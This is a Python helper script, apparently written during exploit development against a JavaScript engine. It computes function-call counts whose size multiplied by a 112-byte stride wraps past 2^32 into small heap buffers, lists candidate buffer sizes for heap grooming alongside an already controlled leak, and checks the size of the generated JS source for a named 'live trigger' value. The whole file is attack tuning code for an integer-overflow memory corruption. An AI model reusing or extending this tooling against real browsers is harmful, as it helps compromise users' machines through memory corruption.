#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PC validation part 2: sweep-harvest tuning.
Test 3: FULL wrap-point family - all N (k=1..8) whose buffer lands in
        the SEGREGATED tier (<4KB) -> the tunable-buffer candidates for
        the sweep geometry (small buffers can fill holes in the FL-leak
        tier we already control).
Test 4: metadata blob byte-count validation - verify the 171MB source
        arithmetic the JS builder uses (CHUNK=4,000,000 chunking).
"""
M = 2**32
STRIDE = 112
S16 = 108  # s_offset16TableSize

print("=== TEST 3: wrap family, buffers < 4KB (segregated tier) ===")
rows = []
for k in range(1, 9):
    # r must be a multiple of 16 (112 = 16*7) and make (k*M+r) % 112 == 0
    # (k*M + r) % 112 == 0  <=>  r ≡ -k*M (mod 112); M mod 112 = 32 -> k*32 mod 112
    base = (-(k * (M % 112))) % 112
    # r = base + 112*t for all r < 4096
    t = 0
    while True:
        r = base + 112 * t
        if r >= 4096:
            break
        N = (k * M + r) // STRIDE
        rows.append((N, r, S16 + r, k))
        t += 1
rows.sort(key=lambda x: (x[2], x[0]))
print(f"{'N':>14} {'wrap':>6} {'buffer':>6}  k  {'source MB':>9}")
for N, r, buf, k in rows:
    srcMB = N * 4 / 1e6  # 'a();' = 4 bytes per call
    print(f"{N:>14,} {r:>6} {buf:>6}  {k}  {srcMB:>9.1f}")

print("\n=== TEST 4: blob arithmetic for N=38,348,816 (our live trigger) ===")
N = 38_348_816
CHUNK = 4_000_000
chunks, rem = divmod(N, CHUNK)
src_calls = N * 4  # 'a();'
header = len("self.__v141fn=function(a){")
footer = len("};self.postMessage({t:\"compiled\"});")
total_src = src_calls + header + footer
print(f"chunks={chunks} rem={rem}")
print(f"calls x4 = {src_calls:,} bytes; header={header} footer={footer}")
print(f"total source = {total_src:,} bytes = {total_src/1e6:.1f} MB")
# JS: 'a();'.repeat(CHUNK) per chunk -> rope; Blob() flattens
print(f"per-chunk string = {CHUNK*4:,} bytes")
# verify a smaller-N candidate source size (188B buffer option)
N2 = 38_347_923
src2 = N2 * 4 + header + footer
print(f"candidate N={N2:,} (188B buffer): source = {src2/1e6:.1f} MB (delta vs live = {(N-N2)*4:,} bytes)")
# sanity: the wrap must hold
assert (N * STRIDE) % M == 100096
assert (N2 * STRIDE) % M == 80
print("wrap checks PASS")
